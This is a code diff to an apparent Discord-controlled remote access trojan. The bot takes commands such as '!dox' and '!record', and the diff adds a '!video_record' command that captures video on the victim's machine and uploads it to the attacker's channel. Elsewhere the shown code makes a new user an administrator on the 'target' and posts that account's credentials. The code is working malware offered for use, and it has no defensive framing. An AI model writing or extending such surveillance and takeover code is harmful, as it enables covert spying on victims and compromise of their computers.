@@ -10,7 +10,7 @@ import platform
 from features.func import *
 from features.setup import *
 from features.steam2fa import *
-from features.screenRecord import *
+from features.video_record import *
 from features.windows import *
 import json
 import re
@@ -51,8 +51,8 @@ def main():
     # this blob is for helping the website backend
     @bot.event
     async def on_message(message):
-        if not message.author.bot:
-            return
+        # if not message.author.bot:
+        #     return
 
         if re.match(r'!dox',message.content):
             await dox(await bot.get_context(message))
@@ -67,6 +67,9 @@ def main():
         elif re.match(r'!record \d+[smh]',message.content):
             record_time = re.findall(r'\d+[smh]$', message.content)[0]
             await record(await bot.get_context(message), record_time)
+        elif re.match(r'!video_record \d+[smh]',message.content):
+            record_time = re.findall(r'\d+[smh]$', message.content)[0]
+            await videorecord(await bot.get_context(message), record_time)
         elif re.match(r'!disconnect',message.content):
             await disconnect(await bot.get_context(message))
         elif re.match(r'!safe_disconnect',message.content):
@@ -194,6 +197,18 @@ def main():
             if add_user_account_to_administrators(username):
                 await ctx.send(f"{username} is now an administrator on target")
                 await ctx.send(f"Creds are - {username}:{username}")
+
+
+    @bot.command()
+    async def videorecord(ctx, record_time):
+        if ctx.channel.name != generate_uuid():
+            return
+
+        recording_path = video_record(record_time)
+        print(f"recording path: {recording_path}")
+        await ctx.send(file=discord.File(recording_path))
+        os.remove(recording_path)
+
 
     @bot.command()
     async def get_help(ctx):
